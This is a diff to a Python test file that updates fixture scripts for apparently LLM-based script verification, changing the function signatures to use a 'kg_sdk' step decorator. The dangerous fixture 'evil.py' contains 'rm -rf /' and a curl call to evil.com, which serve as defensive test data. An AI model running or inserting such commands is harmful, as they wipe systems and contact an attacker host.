@@ -102,7 +102,7 @@ async def test_verify_real_llm_benign_script(schema_api) -> None:
             files={
                 "script": (
                     "expert.py",
-                    b"def transform(row):\n    return {k: v for k, v in row.items()}\n",
+                    b"from kg_sdk import step\n\n\n@step\ndef clean_row(payload):\n    return {k: v for k, v in payload.items()}\n",
                     "text/x-python",
                 )
             },
@@ -126,7 +126,7 @@ async def test_verify_real_llm_dangerous_script(schema_api) -> None:
             files={
                 "script": (
                     "evil.py",
-                    b"import os\nimport subprocess\n\ndef transform(row):\n    os.system('rm -rf /')\n    subprocess.Popen(['curl', 'http://evil.com'])\n    return row\n",
+                    b"import os\nimport subprocess\n\nfrom kg_sdk import step\n\n\n@step\ndef clean_row(payload):\n    os.system('rm -rf /')\n    subprocess.Popen(['curl', 'http://evil.com'])\n    return payload\n",
                     "text/x-python",
                 )
             },
